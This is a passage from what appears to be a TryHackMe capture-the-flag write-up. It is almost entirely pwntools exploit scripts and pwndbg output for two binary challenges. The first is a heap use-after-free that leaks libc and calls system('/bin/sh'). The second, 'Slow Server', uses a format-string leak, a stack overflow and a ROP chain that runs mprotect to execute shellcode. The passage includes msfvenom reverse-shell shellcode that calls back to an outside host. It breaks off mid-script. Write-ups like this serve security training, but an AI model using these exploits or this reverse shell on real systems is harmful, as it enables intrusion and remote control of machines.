+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 3106
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './tryanote']  
+[</span><span class="az">*</span><span class="p">] Libc base: 0x7f5145e82000
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+[1] Create:
+[2] Read:
+[3] Update:
+[4] Delete:
+[5] Win
+[0] Exit:
+>></span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> vmmap libc.so.6
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> | </span><span class="ro">WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="sa">    0x7f5145e7f000     0x7f5145e82000 rw-p     3000      0 [anon_7f5145e7f]
+</span><span class="p">►   0x7f5145e82000     0x7f5145eaa000 r--p    28000      0 /home/user/libc.so.6
+</span><span class="ro">►   0x7f5145eaa000     0x7f514603f000 r-xp   195000  28000 /home/user/libc.so.6
+</span><span class="p">►   0x7f514603f000     0x7f5146097000 r--p    58000 1bd000 /home/user/libc.so.6
+</span><span class="p">►   0x7f5146097000     0x7f514609b000 r--p     4000 214000 /home/user/libc.so.6
+</span><span class="sa">►   0x7f514609b000     0x7f514609d000 rw-p     2000 218000 /home/user/libc.so.6  
+</span><span class="sa">    0x7f514609d000     0x7f51460ac000 rw-p     f000      0 [anon_7f514609d]
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ libcdb</span><span class="p"> file libc.so.6
+[</span><span class="az">*</span><span class="p">]</span><span class="ro"> libc.so.6</span><span class="p">
+    </span><span class="ve">Version:</span><span class="p">     2.35
+    </span><span class="ve">BuildID:</span><span class="p">     89c3cb85f9e55046776471fed05ec441581d1969
+    </span><span class="ve">MD5:</span><span class="p">         0081c1e75ad0afcb24254e7889829f5b
+    </span><span class="ve">SHA1:</span><span class="p">        57541c3937dfcb77c7d2e184bd41e14dff1b954e
+    </span><span class="ve">SHA256:</span><span class="p">      65e8b2bf36961f19908fb8b779139be5458ade165a1ee20a00b7e0b89a80f032  
+    </span><span class="ve">Symbols:</span><span class="p">
+        __libc_start_main_ret = 0x29d90
+                         dup2 = 0x1151c0
+                       printf = 0x60770
+                         puts = 0x80ed0
+                         read = 0x114980
+                   str_bin_sh = 0x1d8698
+                       system = 0x50d60
+                        write = 0x114a20</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">create(</span><span class="mi">0x500</span><span class="p">,</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+create(</span><span class="mi">0x500</span><span class="p">,</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+
+delete(</span><span class="mi">0</span><span class="p">)
+
+libc_base</span><span class="o"> =</span><span class="p"> u64(show(</span><span class="mi">0</span><span class="p">).ljust(</span><span class="mi">8</span><span class="p">,</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">- </span><span class="mi">0x219ce0</span><span class="p">  
+
+update(</span><span class="mi">1</span><span class="p">, p64(libc_base </span><span class="o">+ </span><span class="mi">0x50d60</span><span class="p">)) </span><span class="c1"># system()</span><span class="p">
+win(</span><span class="mi">1</span><span class="p">,</span><span class="na"> str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x1d8698</span><span class="p">))</span><span class="c1"> # "/bin/sh"</span><span class="p">
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x00005569391eb485 </span><span class="p">in</span><span class="am"> win</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rip
+=></span><span class="az"> 0x5569391eb485 </span><span class="p">&lt</span><span class="am">win</span><span class="p">+187>:</span><span class="ve">    call</span><span class="ro">   rdx</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rdx
+   </span><span class="az">0x7f4affb31d60</span><span class="p"> &lt</span><span class="am">__libc_system</span><span class="p">>:</span><span class="ve">      endbr64</span><span class="p">  
+</span><span class="ro">pwndbg></span><span class="p"> x/s $rdi
+</span><span class="az">0x7f4affcb9698</span><span class="p">: "/bin/sh"
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, u64, p64
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"10.10.212.25"</span><span class="p">,</span><span class="mi"> 5001</span><span class="p">)
+
+</span><span class="o">def</span><span class="na"> create</span><span class="p">(</span><span class="ra">size</span><span class="p">, </span><span class="ra">data</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">,</span><span class="no"> b</span><span class="s">"1"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(size).encode())
+    shell.sendafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, data)
+
+</span><span class="o">def</span><span class="na"> show</span><span class="p">(</span><span class="ra">index</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">,</span><span class="no"> b</span><span class="s">"2"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(index).encode())
+    </span><span class="o">return</span><span class="p"> shell.recvline().strip()
+
+</span><span class="o">def</span><span class="na"> update</span><span class="p">(</span><span class="ra">index</span><span class="p">,</span><span class="ra"> data</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">,</span><span class="no"> b</span><span class="s">"3"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">":\n"</span><span class="p">, </span><span class="na">str</span><span class="p">(index).encode())
+    shell.sendafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">, data)
+
+</span><span class="o">def</span><span class="na"> delete</span><span class="p">(</span><span class="ra">index</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">,</span><span class="no"> b</span><span class="s">"4"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(index).encode())
+
+</span><span class="o">def</span><span class="na"> win</span><span class="p">(</span><span class="ra">index</span><span class="p">):
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">>"</span><span class="p">,</span><span class="no"> b</span><span class="s">"5"</span><span class="p">)
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">":</span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(index).encode())
+
+create(</span><span class="mi">0x500</span><span class="p">,</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+create(</span><span class="mi">0x500</span><span class="p">,</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">)
+
+delete(</span><span class="mi">0</span><span class="p">)
+
+libc_base</span><span class="o"> =</span><span class="p"> u64(show(</span><span class="mi">0</span><span class="p">).ljust(</span><span class="mi">8</span><span class="p">,</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">- </span><span class="mi">0x219ce0</span><span class="p">  
+
+update(</span><span class="mi">1</span><span class="p">, p64(libc_base </span><span class="o">+ </span><span class="mi">0x50d60</span><span class="p">)) </span><span class="c1"># system()</span><span class="p">
+win(</span><span class="mi">1</span><span class="p">,</span><span class="na"> str</span><span class="p">(libc_base</span><span class="o"> +</span><span class="mi"> 0x1d8698</span><span class="p">))</span><span class="c1"> # "/bin/sh"</span><span class="p">
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.212.25 on port 5001: Done  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$</span><span class="p"> id
+uid=1000 gid=1000 groups=1000
+</span><span class="ro">$</span><span class="p"> cat flag.txt
+THM{l3arning-h3ap-1nt3rn4ls-with-the-b3ar}
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="slowserver">
+<br><h3 class="post-title">Slow Server</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./slowserver</span><span class="p">
+Server running on http://localhost:5555  </span>
+</code></pre></div></div><br>
+
+<a href="/tryhackme/trypwnmetwo/26.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/26.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/27.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/27.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/28.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/28.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/29.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/29.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/30.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/30.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/31.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/31.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/32.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/32.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/33.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/33.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/34.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/34.png"></p></div></a>
+
+<a href="/tryhackme/trypwnmetwo/35.png" target="_blank"><div><p><img src="/tryhackme/trypwnmetwo/35.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb </span><span class="p">-q slowserver
+Reading symbols from </span><span class="ve">slowserver</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">slowserver</span><span class="p">)  
+</span><span class="ro">pwndbg> </span><span class="p">r
+Starting program: </span><span class="ve">/home/user/slowserver</span><span class="p">
+Server running on http://localhost:5555</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ netcat</span><span class="p"> 127.0.0.1 5555
+DEBUG %p.%p.%p
+0x7fffffffdbb6.0x20.0x555555556080  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> vmmap 0x7fffffffdbb6
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="sa">    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /home/user/ld-linux-x86-64.so.2  
+</span><span class="am">►   0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack] +0x1fbb6
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> vmmap slowserver
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+►   0x555555554000     0x555555555000 r--p     1000      0 /home/user/slowserver
+</span><span class="ro">►   0x555555555000     0x555555556000 r-xp     1000   1000 /home/user/slowserver
+</span><span class="p">►   0x555555556000     0x555555557000 r--p     1000   2000 /home/user/slowserver
+►   0x555555557000     0x555555558000 r--p     1000   2000 /home/user/slowserver
+</span><span class="sa">►   0x555555558000     0x555555559000 rw-p     1000   3000 /home/user/slowserver
+►   0x555555559000     0x55555555b000 rw-p     2000   5000 /home/user/slowserver  
+    </span><span class="az">0x55555555b000     0x55555557c000 rw-p    21000      0 [heap]
+</span><span class="ro">pwndbg></span><span class="p"> p/x 0x555555556080 - 0x555555554000
+</span><span class="az">$1</span><span class="p"> = 0x2080
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, log
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"127.0.0.1"</span><span class="p">,</span><span class="mi"> 5555</span><span class="p">)
+shell.sendline(</span><span class="no">b</span><span class="s">"DEBUG %1$p.%3$p"</span><span class="p">)
+
+leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+stack_leak</span><span class="o"> =</span><span class="na"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)
+binary_base </span><span class="o">= </span><span class="na">int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x2080</span><span class="p">
+
+log.info(</span><span class="no">f</span><span class="s">"Binary base: </span><span class="p">{</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)  
+log.info(</span><span class="no">f</span><span class="s">"Stack leak:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(stack_leak)}</span><span class="s">"</span><span class="p">)
+
+shell.close()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 127.0.0.1 on port 5555: Done  
+[</span><span class="az">*</span><span class="p">] Binary base: 0x555555554000
+[</span><span class="az">*</span><span class="p">] Stack leak: 0x7fffffffdbb6
+[</span><span class="az">*</span><span class="p">] Closed connection to 127.0.0.1 port 5555</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> vmmap 0x555555554000
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+►   0x555555554000     0x555555555000 r--p     1000      0 /home/user/slowserver +0x0
+</span><span class="ro">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/user/slowserver  
+pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, log
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"127.0.0.1"</span><span class="p">,</span><span class="mi"> 5555</span><span class="p">)
+shell.sendline(</span><span class="no">b</span><span class="s">"DEBUG %1$p.%3$p"</span><span class="p">)
+
+leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().split(</span><span class="no">b</span><span class="s">"."</span><span class="p">)
+
+stack_leak</span><span class="o"> =</span><span class="na"> int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">], </span><span class="mi">16</span><span class="p">)
+binary_base</span><span class="o"> =</span><span class="na"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">)</span><span class="o"> -</span><span class="mi"> 0x2080</span><span class="p">
+
+log.info(</span><span class="no">f</span><span class="s">"Binary base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(binary_base)}</span><span class="s">"</span><span class="p">)  
+log.info(</span><span class="no">f</span><span class="s">"Stack leak:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(stack_leak)}</span><span class="s">"</span><span class="p">)
+
+shell.close()
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">5555</span><span class="p">)
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"E"</span><span class="o"> *</span><span class="mi"> 8</span><span class="p">
+
+request</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+request</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"POST </span><span class="mi">\r\n</span><span class="s">"</span><span class="p">
+request</span><span class="o"> +=</span><span class="p"> payload
+
+shell.sendline(request)
+shell.close()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg> </span><span class="p">c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.  
+</span><span class="az">0x000055555555563d </span><span class="p">in</span><span class="am"> handle_post_request </span><span class="p">()
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rip
+=></span><span class="az"> 0x55555555563d</span><span class="p"> &lt</span><span class="am">handle_post_request</span><span class="p">+239>:    </span><span class="ve">ret</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/gx $rsp
+</span><span class="az">0x7fffffffdb68</span><span class="p">: 0x4444444444444444
+</span><span class="ro">pwndbg></span><span class="p"> x/s $rsp + 8
+</span><span class="az">0x7fffffffdb70</span><span class="p">: "EEEEEEEE"
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> p/x 0x7fffffffdbb6 - 0x7fffffffdb70  
+</span><span class="az">$1</span><span class="p"> = 0x46
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">stack_leak </span><span class="o">= </span><span class="na">int</span><span class="p">(leak[</span><span class="mi">0</span><span class="p">], </span><span class="mi">16</span><span class="p">) </span><span class="o">-</span><span class="mi"> 0x46</span><span class="p">
+binary_base </span><span class="o">=</span><span class="na"> int</span><span class="p">(leak[</span><span class="mi">1</span><span class="p">],</span><span class="mi"> 16</span><span class="p">) </span><span class="o">-</span><span class="mi"> 0x2080  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">offset</span><span class="o"> =</span><span class="mi"> 24</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"nop"</span><span class="p">)</span><span class="o"> *</span><span class="mi"> 16</span><span class="p">
+
+payload  </span><span class="o">=</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p64(binary_base </span><span class="o">+</span><span class="mi"> 0x1808</span><span class="p">)</span><span class="c1"> # mov rbp, rsp; pop rax; ret;  </span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0xa</span><span class="p">)</span><span class="c1">                  # syscall = mprotect()</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x1816</span><span class="p">)</span><span class="c1"> # pop rdi; xor rdi, rbp; ret;  </span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(stack_leak</span><span class="o"> &</span><span class="mi"> 0xfff</span><span class="p">)</span><span class="c1">   # clear last bytes</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x1811</span><span class="p">)</span><span class="c1"> # pop rsi; ret;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x1000</span><span class="p">)</span><span class="c1">               # len = 0x1000</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x180d</span><span class="p">)</span><span class="c1"> # pop rdx; pop r12; ret;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x7</span><span class="p">)</span><span class="c1">                  # prot = rwx</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">                  # padding for pop</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(binary_base</span><span class="o"> +</span><span class="mi"> 0x1813</span><span class="p">)</span><span class="c1"> # syscall; ret;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p64(stack_leak</span><span class="o"> +</span><span class="mi"> 0x50</span><span class="p">)</span><span class="c1">    # shellcode address</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> b *handle_post_request+239
+Breakpoint 1 at</span><span class="az"> 0x55555555563d
+</span><span class="ro">pwndbg></span><span class="p"> r
+Starting program: </span><span class="ve">/home/user/slowserver</span><span class="p">
+Server running on http://localhost:5555
+Breakpoint 1,</span><span class="az"> 0x000055555555563d </span><span class="p">in </span><span class="am">handle_post_request</span><span class="p"> ()   
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rip
+=> </span><span class="az">0x55555555563d</span><span class="p"> &lt</span><span class="am">handle_post_request</span><span class="p">+239>:</span><span class="ve">    ret
+</span><span class="ro">pwndbg></span><span class="p"> x/13gx $rsp
+</span><span class="az">0x7fffffffdb68</span><span class="p">: 0x0000555555555808      0x000000000000000a
+</span><span class="az">0x7fffffffdb78</span><span class="p">: 0x0000555555555816      0x0000000000000b70
+</span><span class="az">0x7fffffffdb88</span><span class="p">: 0x0000555555555811      0x0000000000001000
+</span><span class="az">0x7fffffffdb98</span><span class="p">: 0x000055555555580d      0x0000000000000007
+</span><span class="az">0x7fffffffdba8</span><span class="p">: 0x0000000000000000      0x0000555555555813
+</span><span class="az">0x7fffffffdbb8</span><span class="p">: 0x00007fffffffdbc0      0x9090909090909090
+</span><span class="az">0x7fffffffdbc8</span><span class="p">: 0x9090909090909090
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/i $rip
+=></span><span class="az"> 0x555555555813</span><span class="p"> &lt</span><span class="am">__security_Check</span><span class="p">+16>:</span><span class="ve">        syscall  
+</span><span class="ro">pwndbg> </span><span class="p">p/x $rax
+</span><span class="az">$5</span><span class="p"> = 0xa
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rdi
+</span><span class="az">$6</span><span class="p"> = 0x7fffffffd000
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rsi
+</span><span class="az">$7</span><span class="p"> = 0x1000
+</span><span class="ro">pwndbg></span><span class="p"> p/x $rdx
+</span><span class="az">$8</span><span class="p"> = 0x7
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> ni
+</span><span class="az">0x0000555555555815 </span><span class="p">in</span><span class="am"> __security_Check </span><span class="p">()
+</span><span class="ro">pwndbg></span><span class="p"> vmmap $rsp
+LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
+             Start                End Perm     Size Offset File
+</span><span class="sa">    0x7ffffffde000     0x7fffffffd000 rw-p    1f000      0 [anon_7ffffffde]
+</span><span class="ro">►   0x7fffffffd000     0x7fffffffe000 rwxp     1000      0 [anon_7fffffffd] +0xbb8  
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rip
+=></span><span class="az"> 0x555555555815</span><span class="p"> &lt</span><span class="am">__security_Check</span><span class="p">+18>:</span><span class="ve">        ret</span><span class="p">
+</span><span class="ro">pwndbg></span><span class="p"> x/10i *(long long *)$rsp
+   </span><span class="az">0x7fffffffdbc0</span><span class="p">:      </span><span class="ve">nop
+   </span><span class="az">0x7fffffffdbc1</span><span class="p">:      </span><span class="ve">nop
+   </span><span class="az">0x7fffffffdbc2</span><span class="p">:      </span><span class="ve">nop
+   </span><span class="az">0x7fffffffdbc3</span><span class="p">:      </span><span class="ve">nop
+   </span><span class="az">0x7fffffffdbc4</span><span class="p">:      </span><span class="ve">nop
+   </span><span class="az">0x7fffffffdbc5</span><span class="p">:      </span><span class="ve">nop
+   </span><span class="az">0x7fffffffdbc6</span><span class="p">:      </span><span class="ve">nop
+   </span><span class="az">0x7fffffffdbc7</span><span class="p">:      </span><span class="ve">nop
+   </span><span class="az">0x7fffffffdbc8</span><span class="p">:      </span><span class="ve">nop
+   </span><span class="az">0x7fffffffdbc9</span><span class="p">:      </span><span class="ve">nop
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.79.238 LPORT=443 -f python -v shellcode
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of python file: 432 bytes
+shellcode =  b""
+shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
+shellcode += b"\x05\x48\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0d"
+shellcode += b"\x4f\xee\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a"
+shellcode += b"\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21"
+shellcode += b"\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb"
+shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
+shellcode += b"\xe7\x52\x57\x48\x89\xe6\x0f\x05"</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">#!/usr/bin/python3
+from pwn import remote, p64
+
+shell = remote("10.10.212.25", 5555)
+shell.sendline(b"DEBUG %1$p.%3$p")
+
+leak = shell.recvline().strip().split(b".")
+
+stack_leak = int(leak[0], 16) - 0x46
+binary_base = int(leak[1], 16) - 0x2080
+
+shell.close()
+shell = remote("10.10.212.25", 5555)
+
+offset = 24
+junk = b"A" * offset
+
+shellcode =  b""
+shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
+shellcode += b"\x05\x48\x97\x48\xb9\x02\x00\x01\xbb\x0a\x0d"
+shellcode += b"\x4f\xee\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a"
+shellcode += b"\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21"
+shellcode += b"\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb"
+shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
+shellcode += b"\xe7\x52\x57\x48\x89\xe6\x0f\x05"
+
+payload  = b""
+payload += junk
